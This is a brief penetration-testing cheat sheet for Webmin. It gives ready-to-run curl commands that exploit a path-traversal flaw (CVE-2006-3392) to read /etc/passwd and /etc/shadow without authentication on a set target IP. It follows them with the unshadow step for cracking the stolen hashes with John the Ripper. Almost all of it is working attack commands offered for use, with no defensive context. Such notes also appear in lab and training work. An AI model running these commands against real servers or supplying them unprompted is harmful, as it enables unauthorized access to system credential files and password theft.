# Webmin

`export ip=172.20.10.5`

### Test for LFI & file disclosure vulnerability by grabbing /etc/passwd

Some servers can change root path, just change the URL path...

`curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`

### Test to see if webmin is running as root by grabbing /etc/shadow

`curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`


## You can use John to break it

unshadow passwd shadow > Hash

### Resources
* [CVE: CVE-2006-3392](https://www.exploit-db.com/exploits/2017/)